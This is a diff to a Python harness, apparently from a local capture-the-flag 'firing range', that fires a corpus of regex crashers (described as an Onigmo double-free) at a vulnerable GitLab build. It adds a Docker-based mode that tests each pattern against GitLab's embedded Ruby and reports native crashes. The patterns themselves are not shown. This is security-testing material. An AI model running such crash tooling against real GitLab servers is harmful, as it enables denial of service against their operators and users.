@@ -50,10 +50,14 @@ ____/\_____/__|__    who earns FLAG{...}
 
 # ---- target profiles (range compose map) --------------------------------
 TARGETS = {
-    "regrush": "http://127.0.0.1:8021",   # harness (official ruby 3.3.12)
-    "gitlab":  "http://127.0.0.1:8022",   # gitlab-vuln 19.5.0 (pre-patch)
-    "control": "http://127.0.0.1:8023",   # gitlab-patched 19.5.1
+    "regrush":  "http://127.0.0.1:8021",   # harness (official ruby 3.3.12)
+    "gitlab":   "http://127.0.0.1:8022",   # gitlab-vuln 19.5.0 (pre-patch)
+    "control":  "http://127.0.0.1:8023",   # gitlab-patched 19.5.1
+    "embedded": None,                        # omnibus ruby via docker exec/run
 }
+GLAB_CONTAINER = "gitlab-firing-range-gitlab-vuln-1"
+GLAB_RUBY = "/opt/gitlab/embedded/bin/ruby"
+GLAB_IMAGE = "gitlab/gitlab-ce:19.5.0-ce.0"
 
 # ---- crasher corpus (deterministic, source-audited / fuzz-derived) -------
 # F1-N family: parse-error double-free in official Onigmo 6.1.3 builds
@@ -103,6 +107,8 @@ def http(method, url, data=None, headers=None, timeout=15):
 
 # ---------------------------------------------------------------- probe ---
 def probe(base, t0):
+    if base is None:  # embedded target: docker-based, no URL
+        return
     log(">", f"fingerprinting {base}")
     st, body, _ = http("GET", base + "/users/sign_in", timeout=20)
     if st == 200:
@@ -136,6 +142,47 @@ def probe(base, t0):
 
 
 # ---------------------------------------------------------------- crash ---
+import subprocess
+
+
+def ruby_probe_docker(src, image=None):
+    """Compile src in the omnibus embedded ruby; native crash = rc 134/139.
+    Running gitlab-vuln container first, else docker run on pinned image.
+    Loopback by construction (local docker only, no network)."""
+    code = ("begin; Regexp.new(ARGV[0]); Regexp.new(ARGV[0], Regexp::IGNORECASE); "
+            "rescue Exception; end")
+    try:
+        r = subprocess.run(["docker", "exec", GLAB_CONTAINER, GLAB_RUBY,
+                            "-e", code, "--", src],
+                           capture_output=True, timeout=20)
+        return r.returncode, r.stdout + r.stderr
+    except Exception:
+        pass
+    r = subprocess.run(["docker", "run", "--rm", "--entrypoint", GLAB_RUBY,
+                        image or GLAB_IMAGE, "-e", code, "--", src],
+                       capture_output=True, timeout=60)
+    return r.returncode, r.stdout + r.stderr
+
+
+def crash_embedded(t0, args):
+    """In-process compile oracle against the omnibus embedded ruby - our
+    strongest oracle right now (R2/R4: same binary ships in 19.5.0 AND
+    19.5.1). Reports per-pattern native-crash verdicts."""
+    image = getattr(args, "image", None) or GLAB_IMAGE
+    log(">", f"embedded-ruby compile oracle (docker exec/run, image {image})")
+    corpus = list(CRASHERS_REGRUSH) + list(CRASHERS_GITLAB)
+    seen = set()
+    for name, src in corpus:
+        if (name, src) in seen:
+            continue
+        seen.add((name, src))
+        rc, out = ruby_probe_docker(src, image)
+        verdict = ("WORKER CRASH (native)" if rc in (134, 139) else
+                   "clean" if rc == 0 else f"rc={rc}")
+        log("+" if rc in (134, 139) else "x",
+            f"[{name}] {verdict} {out.decode(errors='replace')[:60]!r}")
+
+
 def crash_regrush(base, t0):
     """F1-N family against /compile; oracle = request dies + worker restart."""
     st, b, _ = http("GET", base + "/pid")
@@ -208,15 +255,23 @@ def main():
     p.add_argument("--target", default="gitlab", choices=list(TARGETS),
                    help="target profile (or pass --url)")
     p.add_argument("--url", default=None, help="override target base URL (loopback only)")
+    p.add_argument("--image", default=None,
+                   help="embedded mode: omnibus image tag (default gitlab/gitlab-ce:19.5.0-ce.0)")
     args = p.parse_args()
 
+    if args.mode == "crash" and args.target == "embedded":
+        print(BANNER)
+        crash_embedded(time.time(), args)
+        return
     base = guard(args.url or TARGETS[args.target])
     print(BANNER)
     t0 = time.time()
     if args.mode == "probe":
         probe(base, t0)
     elif args.mode == "crash":
-        if args.target == "regrush" or ":8021" in base:
+        if args.target == "embedded":
+            crash_embedded(t0, args)
+        elif args.target == "regrush" or ":8021" in base:
             crash_regrush(base, t0)
         else:
             crash_gitlab(base, t0)
